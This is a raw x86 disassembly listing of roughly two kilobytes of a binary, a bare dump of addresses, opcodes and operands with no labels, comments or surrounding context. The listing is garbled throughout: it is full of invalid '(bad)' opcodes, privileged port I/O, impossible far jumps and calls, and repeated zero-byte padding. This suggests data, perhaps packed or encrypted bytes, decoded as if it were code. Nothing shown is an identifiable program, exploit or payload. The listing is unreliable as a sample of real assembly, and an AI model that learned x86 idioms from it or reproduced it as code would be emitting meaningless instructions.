  414127:	add    BYTE PTR [eax],al
  414129:	add    BYTE PTR [eax],al
  41412b:	add    BYTE PTR [edi+0x54],bl
  41412e:	xchg   DWORD PTR [ebp+0x44],eax
  414131:	jns    0x414163
  414133:	call   0x416f39
  414138:	ins    BYTE PTR es:[edi],dx
  414139:	(bad)  
  41413a:	pop    edx
  41413b:	pop    esi
  41413c:	aaa    
  41413d:	mov    edx,0x875b0c04
  414143:	in     al,dx
  414144:	jne    0x414170
  414146:	lods   eax,DWORD PTR ds:[esi]
  414147:	lods   al,BYTE PTR ds:[esi]
  414148:	jbe    0x4140f3
  41414a:	add    DWORD PTR [ecx-0x5d],edx
  41414d:	cwde   
  41414e:	nop
  41414f:	inc    ebx
  414150:	add    eax,0xe814a99a
  414155:	lock mov ebp,0x87f53887
  41415b:	shl    BYTE PTR [eax-0x58],0xef
  41415f:	mov    edi,0x5d8cc
  414164:	jne    0x41418a
  414166:	cmp    al,dh
  414168:	clc    
  414169:	sysexit 
  41416b:	push   cs
  41416c:	(bad)  
  41416d:	out    0xa8,eax
  41416f:	mov    dh,0x28
  414171:	stos   BYTE PTR es:[edi],al
  414172:	add    DWORD PTR [edi-0x3f77fad0],eax
  414178:	sub    BYTE PTR [ebx-0x2e668c42],ah
  41417e:	ficom  DWORD PTR [ebx+0x74]
  414181:	test   eax,0x46f6daa8
  414186:	loopne 0x414188
  414188:	cmc    
  414189:	inc    esi
  41418a:	adc    al,0x0
  41418c:	add    DWORD PTR [eax],ebx
  41418e:	jg     0x41418e
  414190:	add    BYTE PTR [eax],al
  414192:	add    BYTE PTR [eax],al
  414194:	add    BYTE PTR [edi+ebp*8+0x51],dh
  414198:	mov    eax,edi
  41419a:	mov    al,ds:0x1c8d5d8e
  41419f:	mov    ebx,0x41bb8d13
  4141a4:	add    dh,dh
  4141a6:	std    
  4141a7:	mov    ebx,0x3896f000
  4141ac:	xor    esi,edi
  4141ae:	or     eax,0xa53281b0
  4141b3:	add    dh,0x72
  4141b6:	adc    ebx,DWORD PTR [eax]
  4141b8:	push   esi
  4141b9:	mov    ds:0x8b581530,al
  4141be:	jmp    0x272c2c6
  4141c3:	xrelease xchg BYTE PTR ds:0xb6bcfa2e,dh
  4141ca:	mov    edx,0x810d4762
  4141cf:	and    eax,0xe7b70ad9
  4141d4:	clc    
  4141d5:	mov    bh,0xb2
  4141d7:	mov    ecx,0x62000cdd
  4141dc:	inc    edi
  4141dd:	in     eax,dx
  4141de:	mov    BYTE PTR [edi+ebx*8+0x1ffcb744],ah
  4141e5:	xchg   DWORD PTR [edx-0x19],eax
  4141e8:	mov    BYTE PTR [esi-0x4e],ah
  4141eb:	fcmovu st,st(0)
  4141ed:	and    al,0x2a
  4141ef:	sbb    eax,DWORD PTR [esi*2+0x368e9a02]
  4141f6:	mov    cl,BYTE PTR [edi]
  4141f8:	pop    ebp
  4141f9:	add    BYTE PTR [eax],al
  4141fb:	add    BYTE PTR [eax],al
  4141fd:	add    BYTE PTR [ecx],bl
  4141ff:	add    edi,esp
  414201:	lock repnz add dh,ch
  414205:	sti    
  414206:	aaa    
  414207:	adc    ch,BYTE PTR [ebp-0x120205ba]
  41420d:	xchg   esi,eax
  41420e:	mov    ch,0x89
  414210:	xor    al,0xbd
  414212:	cli    
  414213:	sub    al,0xb7
  414215:	mov    ch,BYTE PTR [esi]
  414217:	mov    ds:0xbfd00d27,al
  41421c:	jo     0x414264
  41421e:	popf   
  41421f:	cli    
  414220:	test   eax,0xea2ffb0c
  414225:	add    esi,DWORD PTR [ebp-0x77]
  414228:	sub    al,0xe0
  41422a:	je     0x4141ed
  41422c:	fcmovbe st,st(1)
  41422e:	pusha  
  41422f:	xor    BYTE PTR [edi-0x1ad6ed10],dl
  414235:	and    eax,0x5a3b3ff2
  41423a:	out    dx,al
  41423b:	aaa    
  41423c:	xor    eax,0x1d0cb0
  414241:	inc    edx
  414242:	and    eax,0x5f7b89b7
  414247:	lods   al,BYTE PTR ds:[esi]
  414248:	fld1   
  41424a:	jbe    0x41424e
  41424c:	add    esp,edx
  41424e:	retf   0x537d
  414251:	pop    ebp
  414252:	sub    DWORD PTR [edi+0x4e],0xd431fe06
  414259:	iret   
  41425a:	std    
  41425b:	(bad)  
  41425c:	or     eax,0x29064
  414261:	jmp    0x414266
  414266:	add    BYTE PTR [eax+0x79f07ded],bl
  41426c:	sbb    DWORD PTR [ecx+ebp*8-0x5b76fd8a],0xf93c8312
  414277:	jbe    0x414280
  414279:	sbb    DWORD PTR [ecx+0x2f000274],0x7a
  414280:	adc    bh,bh
  414282:	imul   esi,DWORD PTR [ebx],0x12
  414285:	push   eax
  414286:	pusha  
  414287:	jae    0x414237
  414289:	call   0xfdf9358d
  41428e:	jb     0x414251
  414290:	sbb    ecx,0x7aed4d55
  414296:	stc    
  414297:	inc    esp
  414298:	push   ebp
  414299:	and    DWORD PTR [edi-0x2e8c8282],0x530d33ec
  4142a3:	gs mov bh,0x73
  4142a6:	rol    edi,0xb7
  4142a9:	adc    edx,DWORD PTR [ecx]
  4142ab:	xchg   DWORD PTR [edx+0x0],eax
  4142ae:	push   0x35
  4142b0:	push   es
  4142b1:	sub    DWORD PTR [ecx+0x684504a5],0x37
  4142b8:	(bad)  
  4142ba:	call   0xbc3e35
  4142bf:	sbb    al,0xef
  4142c1:	fsub   st(3),st
  4142c3:	add    esp,esi
  4142c5:	cli    
  4142c6:	fistp  DWORD PTR ds:0x30001
  4142cc:	add    BYTE PTR [eax],al
  4142ce:	add    BYTE PTR [eax],al
  4142d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142d1:	mov    ch,0xf8
  4142d3:	jb     0x41434a
  4142d5:	test   DWORD PTR [ecx+0x10],eax
  4142d8:	inc    ebp
  4142d9:	rcl    edi,0x1
  4142dc:	sbb    al,0x1
  4142de:	inc    edx
  4142e0:	test   eax,0xc01d789
  4142e5:	add    DWORD PTR [ebx-0x18],edx
  4142e8:	inc    esp
  4142e9:	push   ebx
  4142ea:	std    
  4142eb:	push   DWORD PTR [edi]
  4142ed:	cld    
  4142ee:	xor    eax,eax
  4142f0:	push   eax
  4142f1:	mov    esi,0x4b9b0c74
  4142f6:	adc    BYTE PTR [ebx-0x17b0eeef],cl
  4142fc:	xchg   esi,eax
  4142fd:	test   ebx,edi
  4142ff:	dec    DWORD PTR [edi]
  414301:	imul   ebp,DWORD PTR [ecx+0x54],0x758900cd
  414308:	shr    BYTE PTR [eax-0xe],0x83
  41430c:	stos   DWORD PTR es:[edi],eax
  41430d:	ja     0x4142f4
  41430f:	loope  0x4142ae
  414311:	add    BYTE PTR [eax],al
  414313:	xor    ebx,esi
  414315:	cmp    DWORD PTR [edi+0x37ce41f7],0x55
  41431c:	lods   al,BYTE PTR ds:[esi]
  41431d:	jmp    0x41434c
  41431f:	addr16 leavew 
  414322:	or     eax,DWORD PTR [eax+ecx*8+0x26fffffd]
  414329:	cld    
  41432a:	push   edi
  41432b:	data16 aad 0x42
  41432e:	mov    ah,0xf
  414330:	loop   0x414373
  414332:	sub    BYTE PTR [esi+0x0],ah
  414335:	add    BYTE PTR [eax],al
  414337:	add    BYTE PTR [eax],al
  414339:	out    0x49,eax
  41433b:	and    esp,DWORD PTR [esi+0xd]
  41433e:	pop    edi
  41433f:	or     BYTE PTR [esi+0x75],ah
  414342:	mov    al,ds:0xdefc66c4
  414347:	jno    0x4142d4
  414349:	mov    ebx,0xa5042bc8
  41434e:	es inc eax
  414350:	mov    eax,0x371fbf1e
  414355:	stos   DWORD PTR es:[edi],eax
  414356:	jb     0x414362
  414358:	test   BYTE PTR [eax],al
  41435a:	stos   DWORD PTR es:[edi],eax
  41435b:	add    DWORD PTR [eax],eax
  41435d:	(bad)  
  41435e:	lods   al,BYTE PTR ds:[esi]
  41435f:	pop    ecx
  414360:	data16 cld 
  414362:	ins    WORD PTR es:[edi],dx
  414364:	or     eax,0x65fb5bc3
  414369:	out    dx,al
  41436a:	imul   edi,esp,0x65
  41436d:	xor    al,0x4b
  41436f:	or     DWORD PTR [esi+0x7e],esp
  414372:	jmp    0x4688:0x2b30871e
  414379:	mov    WORD PTR [edi+0x5ee85011],cs
  41437f:	jne    0x4143d1
  414381:	shl    BYTE PTR [esi-0x56cae9bb],cl
  414387:	or     dh,BYTE PTR [ebp-0x3b7a0ac8]
  41438d:	imul   ecx,DWORD PTR [edi-0x51c817fc],0xeb7a0002
  414397:	rcl    BYTE PTR [eax-0x10],0x26
  41439b:	pop    esp
  41439c:	cld    
  41439d:	add    BYTE PTR [eax],al
  41439f:	add    BYTE PTR [eax],al
  4143a1:	add    BYTE PTR [edx+0x61e8acd4],bl
  4143a7:	stos   BYTE PTR es:[edi],al
  4143a8:	add    DWORD PTR [ecx+0x30b8a130],ecx
  4143ae:	lock jmp 0x4143b7
  4143b1:	push   0x76
  4143b3:	loopne 0x414339
  4143b5:	mov    ebx,0xfdb76dcd
  4143ba:	cld    
  4143bb:	adc    eax,0x2a8e8ac
  4143c0:	aam    0x2
  4143c2:	jne    0x414377
  4143c4:	adc    al,0x10
  4143c6:	(bad)  
  4143c7:	cmp    al,0x5b
  4143c9:	sub    al,0xed
  4143cb:	mul    esi
  4143cd:	add    ebp,esp
  4143cf:	ret    0xce8f
  4143d2:	ds add ah,bh
  4143d5:	jg     0x41440c
  4143d7:	cs mov al,0xb8
  4143da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143db:	push   cs
  4143dc:	cs hlt 
  4143de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143df:	add    ah,bh
  4143e1:	push   eax
  4143e2:	(bad)  
  4143e3:	out    0xbe,al
  4143e5:	xchg   BYTE PTR [esi-0x52789b76],ah
  4143eb:	mov    dh,0x4e
  4143ed:	mov    ecx,0x2e7fc0d
  4143f2:	jne    0x414472
  4143f4:	daa    
  4143f5:	xor    BYTE PTR [ebx+esi*4+0x44fc0fbc],cl
  4143fc:	fisttp DWORD PTR [edx+eiz*8+0x3d8f744b]
  414403:	mov    dh,0x1e
  414405:	mov    ecx,0x0
  41440a:	add    BYTE PTR [edi],ah
  41440c:	mov    bl,0xb7
  41440e:	push   esi
  414410:	rcr    esi,0x7e
  414413:	je     0x414416
  414415:	out    0x3,eax
  414417:	in     al,dx
  414418:	sub    al,0xf3
  41441a:	add    al,0x26
  41441c:	sahf   
  41441d:	addr16 cli 
  41441f:	stos   BYTE PTR es:[edi],al
  414420:	add    esp,DWORD PTR [eax+edx*8+0x75]
  414424:	add    ah,bh
  414426:	stos   DWORD PTR es:[edi],eax
  414427:	ror    DWORD PTR [edi-0x3e06fc18],1
  41442d:	out    0x7f,al
  41442f:	mov    al,0x1
  414431:	out    0x3,eax
  414433:	out    dx,al
  414434:	cmp    al,0xbf
  414436:	hlt    
  414437:	jns    0x41448a
  414439:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41443a:	add    DWORD PTR [edx+0x7b],esi
  41443d:	add    BYTE PTR [eiz*1+0x1d634d9b],dh
  414444:	mov    al,0x89
  414446:	rcr    DWORD PTR [ecx-0x31],0x74
  41444a:	sbb    BYTE PTR [esi+0x2d],cl
  41444d:	clc    
  41444e:	pop    ds
  41444f:	xchg   edi,eax
  414450:	jnp    0x414443
  414452:	add    esp,DWORD PTR [ebp-0x51]
  414455:	jae    0x4143e8
  414457:	repz dec eax
  414459:	or     eax,0x5815ec19
  41445e:	fbstp  TBYTE PTR [esi+0x7aa58102]
  414464:	test   eax,eax
  414466:	(bad)  [edi+eax*2+0x7f]
  41446a:	daa    
  41446b:	xor    DWORD PTR [edx+0xe9fd],esi
  414471:	add    BYTE PTR [eax],al
  414473:	add    BYTE PTR [ecx],cl
  414475:	sub    eax,0x9c1cdbf8
  41447a:	inc    eax
  41447b:	inc    edi
  41447c:	mov    ah,0xfa
  41447e:	jg     0x41443f
  414480:	jle    0x414485
  414482:	jbe    0x41448b
  414484:	sahf   
  414485:	scas   eax,DWORD PTR es:[edi]
  414486:	fld1   
  414488:	jbe    0x41448c
  41448a:	add    DWORD PTR [edx],esp
  41448c:	fldcw  WORD PTR [edx+0x46000072]
  414492:	clc    
  414493:	xor    BYTE PTR [esi+0x76e8ffcb],0x3
  41449a:	shl    DWORD PTR [ebp+ebp*8-0x35],0xff
  41449f:	call   0xce299c1a
  4144a4:	cmp    dh,BYTE PTR [ecx-0xb87fd03]
  4144aa:	mov    edi,0x136b16d
  4144af:	fidivr WORD PTR [edx+ebp*4]
  4144b2:	mov    DWORD PTR [ecx+ecx*8],ebp
  4144b5:	push   ebx
  4144b6:	call   0xfdf133c2
  4144bb:	add    BYTE PTR [edi+0x5e],bl
  4144be:	lds    edx,FWORD PTR [edx+0x5d]
  4144c1:	add    eax,0x5e287589
  4144c6:	dec    esi
  4144c7:	adc    BYTE PTR [ebx],0x79
  4144ca:	xchg   DWORD PTR [ebp+0x64],esi
  4144cd:	jp     0x41454d
  4144cf:	sbb    BYTE PTR [ebx+0x4e181179],cl
  4144d5:	inc    ebp
  4144d6:	add    BYTE PTR [edx+0x0],ch
  4144d9:	add    BYTE PTR [eax],al
  4144db:	add    BYTE PTR [eax],al
  4144dd:	dec    eax
  4144de:	js     0x414551
  4144e0:	call   0x5645b5b4
  4144e5:	mov    bl,0x13
  4144e7:	pop    eax
  4144e8:	push   ss
  4144e9:	pop    esp
  4144ea:	push   es
  4144eb:	jg     0x4144b1
  4144ed:	inc    eax
  4144ee:	add    al,0x75
  4144f1:	and    ebx,ebx
  4144f3:	adc    edx,DWORD PTR [eax-0x36]
  4144f6:	ja     0x414509
  4144f8:	push   eax
  4144f9:	or     al,BYTE PTR [ebp+0x0]
  4144fc:	sbb    DWORD PTR [eax-0x6],0x52
  414500:	call   FWORD PTR [ecx]
  414502:	sbb    DWORD PTR [edx],edx
  414504:	inc    eax
  414505:	fdivr  QWORD PTR [ecx-0x4f]
  414508:	pop    eax
  414509:	mov    al,ds:0x2ce8fb79
  41450e:	popf   
  41450f:	(bad)  
  414510:	jmp    DWORD PTR [edi+0x4b]
  414513:	loopne 0x414558
  414515:	inc    ebp
  414516:	dec    ebx
  414517:	loopne 0x414554
  414519:	add    ebp,ecx
  41451b:	or     eax,DWORD PTR [edx-0x495fd]
  414521:	gs cdq 
  414523:	add    BYTE PTR [eax],al
  414525:	pushf  
  414526:	jns    0x414569
  414528:	adc    bh,ch
  41452a:	retf   
  41452b:	push   eax
  41452c:	mov    ecx,esi
  41452e:	or     al,ch
  414530:	imul   esp,DWORD PTR ds:0x5989fb78,0x12
  414537:	aaa    
  414538:	ret    
  414539:	jne    0x41458a
  41453b:	dec    ebx
  41453c:	aaa    
  41453d:	and    BYTE PTR [ebx+0x3c2b],ch
  414543:	add    BYTE PTR [eax],al
  414545:	add    al,ch
  414547:	dec    eax
  414548:	add    eax,0x10546589
  41454d:	mov    esi,DWORD PTR [ebx+0x62504ea8]
  414553:	xlat   BYTE PTR ds:[ebx]
  414554:	pop    ecx
  414555:	push   ss
  414556:	mov    ch,0x99
  414558:	add    ah,0x81
  41455b:	shl    DWORD PTR es:[ebx+edi*2-0x24],0x82
  414561:	(bad)  
  414562:	push   ds
  414563:	fwait
  414564:	add    DWORD PTR [eax],eax
  414566:	jle    0x41454e
  414568:	adc    esi,DWORD PTR [edx+0x15]
  41456b:	xchg   ebp,eax
  41456c:	adc    BYTE PTR [eax+0x7401a1ab],al
  414572:	jb     0x414594
  414574:	xor    BYTE PTR [esi+ebp*8],dl
  414577:	pop    esi
  414578:	adc    esi,eax
  41457a:	mov    ebx,0x9ee801b1
  41457f:	and    dh,BYTE PTR [esi+0xdd702fd]
  414585:	call   0x45d0f3
  41458a:	add    BYTE PTR [edi+0x5],dh
  41458d:	call   0xfdf76096
  414592:	out    dx,al
  414593:	pop    esi
  414594:	or     DWORD PTR [ebx-0x2b1fe9e],ecx
  41459a:	push   0x75401201
  41459f:	and    al,0x40
  4145a1:	aam    0x4f
  4145a3:	mov    ch,0x82
  4145a5:	shr    BYTE PTR [edx-0x77],0x82
  4145a9:	lds    eax,FWORD PTR [eax]
  4145ab:	add    BYTE PTR [eax],al
  4145ad:	add    BYTE PTR [eax],al
  4145af:	jns    0x414549
  4145b1:	mov    dh,0x13
  4145b3:	cmp    edi,ecx
  4145b5:	inc    ecx
  4145b6:	add    dh,dh
  4145b8:	in     eax,0x4
  4145ba:	push   esi
  4145bb:	call   0xe742:0x6717fc02
  4145c2:	xchg   dh,al
  4145c4:	dec    edx
  4145c5:	shl    DWORD PTR [ebp-0x4adb3780],cl
  4145cb:	jp     0x414574
  4145cd:	adc    ebp,ecx
  4145cf:	jae    0x414580
  4145d1:	mov    esi,0xaa9a592f
  4145d6:	push   ebx
  4145d7:	bound  ebp,QWORD PTR [edi-0x65aed052]
  4145dd:	bound  edx,QWORD PTR [ebx+0x52]
  4145e0:	scas   eax,DWORD PTR es:[edi]
  4145e1:	jno    0x414622
  4145e3:	dec    eax
  4145e4:	dec    edi
  4145e5:	xor    eax,0xf7c43a59
  4145ea:	add    esp,DWORD PTR [esi+0x2183937b]
  4145f0:	inc    esi
  4145f1:	jmp    0x1d94baf9
  4145f6:	dec    ebp
  4145f7:	out    dx,al
  4145f8:	je     0x4145a1
  4145fa:	mov    bh,0x18
  4145fc:	scas   eax,DWORD PTR es:[edi]
  4145fd:	dec    edi
  4145fe:	popa   
  4145ff:	adc    ch,BYTE PTR [edi+0x7d2df0e7]
  414605:	lods   al,BYTE PTR ds:[esi]
  414606:	jae    0x4145ad
  414608:	jns    0x4145b6
  41460a:	mov    bl,0xf2
  41460c:	dec    esp
  41460d:	push   ebx
  41460e:	mov    ecx,DWORD PTR [esi-0x4a]
  414611:	jo     0x41466a
  414613:	add    BYTE PTR [eax],al
  414615:	add    BYTE PTR [eax],al
  414617:	add    ch,ch
  414619:	js     0x4145af
  41461b:	mov    bh,0xcd
  41461d:	adc    al,0x64
  41461f:	mov    ch,0xd8
  414621:	daa    
  414622:	loopne 0x41467a
  414624:	add    eax,0x3686d736
  414629:	jb     0x4145e2
  41462b:	xchg   BYTE PTR [esi],dh
  41462d:	mov    dh,0xb7
  41462f:	stos   DWORD PTR es:[edi],eax
  414630:	jns    0x4145c8
  414632:	call   0x74033f3a
  414637:	adc    al,0xa8
  414639:	xor    al,0x0
  41463b:	cmc    
  41463c:	jmp    0x66433a73
  414641:	adc    al,BYTE PTR [eax]
  414643:	jmp    0x71357911
  414648:	dec    ebx
  414649:	mov    dl,0xe8
  41464b:	cmp    ah,BYTE PTR [esi]
  41464d:	scas   eax,DWORD PTR es:[edi]
  41464e:	std    
  41464f:	pusha  
  414650:	and    esi,DWORD PTR [esi-0x79cedb79]
  414656:	pop    ebx
  414657:	mov    ebp,0xb4c481f3
  41465c:	sub    DWORD PTR [eax-0x4964a3b0],esi
  414662:	push   eax
  414663:	xchg   ecx,eax
  414664:	jg     0x4145fc
  414666:	(bad)  
  414667:	call   0xf6b60936
  41466c:	or     DWORD PTR [edx],esi
  41466e:	cld    
  41466f:	mov    cs,WORD PTR [ebx-0x7938174a]
  414675:	add    al,BYTE PTR [eax]
  414677:	jle    0x4146d4
  414679:	mov    dh,0x87
  41467b:	sub    al,0x0
  41467d:	add    BYTE PTR [eax],al
  41467f:	add    BYTE PTR [eax],al
  414681:	int    0x9a
  414683:	and    BYTE PTR [eax],bl
  414685:	jbe    0x414689
  414687:	xchg   esp,eax
  414689:	loop   0x414610
  41468b:	pop    ebx
  41468c:	popa   
  41468d:	dec    DWORD PTR [ecx-0x4]
  414690:	push   esi
  414691:	push   ebx
  414692:	mov    dh,0xe8
  414694:	fisub  WORD PTR [edi-0x782c0253]
  41469a:	jns    0x414717
  41469c:	sbb    eax,0x1e1c9a4e
  4146a1:	jbe    0x4146a5
  4146a3:	mov    DWORD PTR [edx+edx*1-0x269e3714],ebx
  4146aa:	aaa    
  4146ab:	inc    eax
  4146ac:	jmp    0xd1098d22
  4146b1:	sub    esi,DWORD PTR [edx+0x417bde4f]
  4146b7:	lock add BYTE PTR [edi+esi*2],cl
  4146bb:	mov    cl,0x3c
  4146bd:	stos   BYTE PTR es:[edi],al
  4146be:	jno    0x4146bb
  4146c0:	mov    edx,DWORD PTR [ebx+0x51]
  4146c3:	mov    DWORD PTR [ebp+0x74],eax
  4146c6:	push   edx
  4146c7:	push   eax
  4146c8:	call   0x3e43f9
  4146cd:	pop    ds
  4146ce:	mov    edx,0x7621ff18
  4146d3:	xchg   eax,esi
  4146d5:	mov    ah,0xc0
  4146d7:	push   eax
  4146d8:	add    DWORD PTR [eax+esi*2+0x71],ebx
  4146dc:	in     al,dx
  4146dd:	inc    esp
  4146de:	mov    eax,0x684c0150
  4146e3:	ficomp WORD PTR [ebx]
  4146e5:	add    BYTE PTR [eax],al
  4146e7:	add    BYTE PTR [eax],al
  4146e9:	add    BYTE PTR [edx],ah
  4146eb:	imul   edx,esi,0xba8e7123
  4146f1:	out    dx,al
  4146f2:	pop    ebp
  4146f3:	add    DWORD PTR [eax],eax
  4146f5:	mov    edx,DWORD PTR [edx]
  4146f7:	or     DWORD PTR [ecx-0x48f1640],0xffffff88
  4146fe:	adc    eax,0xf6754a46
  414703:	push   eax
  414704:	pop    esi
  414705:	pop    ebx
  414706:	aad    0xc4
  414708:	push   ecx
  414709:	mov    ebx,DWORD PTR [eax-0x62071b7b]
  41470f:	bound  ebx,QWORD PTR [eax+eax*1-0x74b0fee4]
  414716:	inc    ebp
  414717:	sub    eax,0x47c2044f
  41471c:	adc    edx,0x75fb0a30
  414722:	int3   
  414723:	sub    ecx,DWORD PTR [ecx+0x8]
  414726:	stos   DWORD PTR es:[edi],eax
  414727:	jmp    0x414734
  414729:	push   0xffffffd1
  41472b:	cmp    al,ch
  41472d:	neg    BYTE PTR [ecx-0x637bfffa]
  414733:	jmp    0x7c80:0xab756a77
  41473a:	xchg   ecx,eax
  41473b:	mov    bh,0x49
  41473d:	call   0x45543b
  414742:	stos   BYTE PTR es:[edi],al
  414743:	daa    
  414744:	stc    
  414745:	mov    ch,BYTE PTR [ecx]
  414747:	mov    edi,0xa726fd0d
  41474c:	cdq    
  41474d:	jb     0x41474f
  41474f:	add    BYTE PTR [eax],al
  414751:	add    BYTE PTR [eax],al
  414753:	stc    
  414754:	cdq    
  414755:	add    DWORD PTR [ecx+0x248531b2],ecx
  41475b:	jmp    0x8d4148fa
  414760:	sbb    al,0xaf
  414762:	std    
  414763:	jb     0x414796
  414765:	mov    cl,0x83
  414767:	arpl   si,si
  414769:	pop    ss
  41476a:	push   esi
  41476b:	out    dx,al
  41476c:	pop    esp
  41476d:	push   ecx
  41476e:	mov    esi,DWORD PTR [ecx+0x5d4fe405]
  414774:	test   eax,0xf44aff88
  414779:	fwait
  41477a:	xor    esp,DWORD PTR [ebp-0x4e74fe66]
  414780:	lds    ecx,FWORD PTR [ecx]
  414782:	push   eax
  414783:	xor    ch,BYTE PTR [edi-0x625f02ef]
  414789:	mov    dl,0x73
  41478b:	ins    DWORD PTR es:[edi],dx
  41478c:	xor    al,0x36
  41478e:	or     BYTE PTR ds:0x12ff03dd,cl
  414794:	push   ds
  414795:	shl    DWORD PTR [ebx+edi*2+0x18],0x6d
  41479a:	and    al,0xd5
  41479c:	cdq    
  41479d:	add    DWORD PTR [eax],eax
  41479f:	inc    edi
  4147a0:	rol    DWORD PTR ds:0x35074b1,cl
  4147a6:	xor    cl,dh
  4147a8:	push   ds
  4147a9:	xor    eax,0x5d417d24
  4147ae:	test   BYTE PTR [ecx+ebx*4+0x7b],dh
  4147b2:	shl    DWORD PTR [edx],0x2
  4147b5:	lds    ecx,FWORD PTR [esi+0x0]
  4147b8:	add    BYTE PTR [eax],al
  4147ba:	add    BYTE PTR [eax],al
  4147bc:	cld    
  4147bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147be:	mov    esp,0x7f0271c5
  4147c3:	mov    eax,ds:0x1be7abba
  4147c8:	frstor [eax-0x54bcfc56]
  4147ce:	aam    0x3f
  4147d0:	mov    eax,DWORD PTR [edx-0x19]
  4147d3:	xchg   BYTE PTR [ecx-0x48646b02],dh
  4147d9:	add    bh,ah
  4147db:	add    edi,esp
  4147dd:	les    ebp,FWORD PTR [edx+0x6a9eec57]
  4147e3:	mov    al,ds:0x71364f4d
  4147e8:	arpl   WORD PTR [ecx],ax
  4147ea:	out    0x3,eax
  4147ec:	rcr    BYTE PTR [eax],0xe7
  4147ef:	pop    ecx
  4147f0:	pusha  
  4147f1:	adc    eax,0x2b51a17
  4147f6:	push   0xffffffc8
  4147f8:	cmp    DWORD PTR [ebp+0x2d],0xdd79a508
  4147ff:	fwait
  414800:	aas    
  414801:	imul   ebp,eax,0xdf44ec03
  414807:	jp     0x4147c4
  414809:	cs je  0x414796
  41480c:	cmc    
  41480d:	add    edi,esp
  41480f:	add    eax,ebp
  414811:	call   0x401:0x275501f
  414818:	lahf   
  414819:	fidiv  DWORD PTR [ebx+0x47]
  41481c:	sub    eax,0xe4f52
  414821:	add    BYTE PTR [eax],al
  414823:	add    BYTE PTR [eax],al
  414825:	sbb    eax,0x4d1de702
  41482a:	jge    0x4147c8
  41482c:	retf   
  41482d:	inc    BYTE PTR [ebx+0x2750457]
  414833:	cwde   
  414834:	fwait
  414835:	imul   ecx,esp,0x0
  414838:	ss and al,0x6d
  41483b:	std    
  41483c:	cs jns 0x414841
  41483f:	push   0xffffffe8
  414841:	dec    ecx
  414842:	(bad)
  414845:	pushf  
  414846:	add    DWORD PTR [eax],eax
  414848:	out    0x3d,al
  41484a:	retf   0xe86a
  41484d:	xor    ebp,eax
  41484f:	mov    edi,0xc39a810a
  414854:	push   ss
  414855:	jns    0x414859
  414857:	or     eax,0xc0f8b13e
  41485c:	pusha  
  41485d:	jmp    DWORD PTR [ebx+0x1876e8ff]
  414863:	push   DWORD PTR [ecx-0x53]
  414866:	cdq    
  414867:	scas   eax,DWORD PTR es:[edi]
  414868:	mov    esi,0x960d0276
  41486d:	ds sbb eax,0x6a3d71ff
  414873:	loope  0x41484e
  414875:	(bad)  
  414876:	fs aad 0xe9
  414879:	jbe    0x414872
  41487b:	mov    ah,0xa9
  41487d:	push   ecx
  41487e:	ret    
  41487f:	pop    ebp
  414880:	jo     0x41487e
  414882:	pushf  
  414883:	(bad)  
  414884:	call   0x3307c3ff
  414889:	add    BYTE PTR [eax],al
  41488b:	add    BYTE PTR [eax],al
  41488d:	add    dh,bh
  41488f:	les    eax,FWORD PTR [ecx+ebp*8]
  414892:	retf   
  414893:	jnp    0x414881
  414895:	sbb    ah,cl
  414897:	addr16 out dx,al
  414899:	call   0x3964b14
  41489e:	jno    0x4148f3
  4148a0:	std    
  4148a1:	aam    0xa6
  4148a3:	adc    BYTE PTR [eax-0x17],al
  4148a6:	icebp  
  4148a7:	mov    esi,0x36ac6c0c
  4148ac:	push   eax
  4148ad:	ret    
  4148ae:	or     al,BYTE PTR [ecx+0x3b73ae39]
  4148b4:	add    al,0x0
  4148b6:	addr16 mov edx,0x4cbbfe8
  4148bc:	add    BYTE PTR [ebx+0xc14a],cl
  4148c2:	fsub   QWORD PTR [esi]
  4148c4:	cmp    DWORD PTR [edx+ecx*8+0x45],ecx
  4148c8:	add    BYTE PTR [ecx+0x1069da0f],cl
  4148ce:	push   ecx
  4148cf:	jnp    0x414899
  4148d1:	add    BYTE PTR [ebp+eax*1-0x7ae072b0],bl
  4148d8:	add    BYTE PTR [eax],al
  4148da:	mov    WORD PTR [ebp-0x5],ss
  4148dd:	xlat   BYTE PTR ds:[ebx]
  4148de:	hlt    
  4148df:	(bad)  
  4148e0:	cld    
  4148e1:	call   FWORD PTR [eax+ebp*1+0x59cd886]
  4148e8:	add    BYTE PTR [eax+0x11],dl
  4148eb:	test   DWORD PTR [eax+0x50058c00],edx
  4148f1:	inc    DWORD PTR [eax]
  4148f3:	add    BYTE PTR [eax],al
  4148f5:	add    BYTE PTR [eax],al
  4148f7:	sub    eax,DWORD PTR [ebp+0x303318c4]
  4148fd:	in     al,dx
  4148fe:	add    ecx,DWORD PTR [ebp+eax*1-0x77]
  414902:	xchg   BYTE PTR [eax],ch
  414904:	add    eax,0x836c0000
  414909:	xchg   ah,bl
  41490b:	pop    ebp
  41490c:	add    eax,0x5dc75000
  414911:	call   0x4696f6
  414916:	dec    edx
  414918:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414919:	add    eax,DWORD PTR [eax]
  41491b:	sbb    al,0x82
  41491d:	xchg   BYTE PTR [eax],al
  41491f:	sbb    al,BYTE PTR ds:0x80915000
  414925:	clc    
  414926:	add    ebx,DWORD PTR [eax*1+0x462e850]
  41492d:	add    BYTE PTR [eax],al
  41492f:	xchg   ecx,eax
  414930:	adc    BYTE PTR [esi+eax*1],0x75
  414934:	fwait
  414935:	add    DWORD PTR [eax-0x2],edx
  414938:	fistp  DWORD PTR [ebx+0x19b7785]
  41493e:	mov    ebp,0x3e7e2
  414943:	dec    edi
  414944:	call   0xd5:0xf6ddc57a
  41494b:	jne    0x4148fd
  41494d:	jbe    0x41490f
  41494f:	mov    ah,0xfa
  414951:	adc    eax,DWORD PTR [edi-0xe5f0d0]
  414957:	(bad)  
  414958:	fistp  WORD PTR [ebx+0xca]
  41495e:	add    BYTE PTR [eax],al
  414960:	ret    
  414961:	call   0x42f8:0xdaea0d01
  414968:	cdq    
  414969:	(bad)  
  41496a:	jl     0x4148ed
  41496c:	fwait
  41496d:	cdq    
  41496e:	add    DWORD PTR [eax],eax
  414970:	(bad)  
  414971:	sbb    BYTE PTR ds:0x7c9b7508,cl
  414977:	or     DWORD PTR [edi-0x1fffe67],0xc0c1bc5c
  414981:	xor    al,0x1d
  414983:	and    al,0x6d
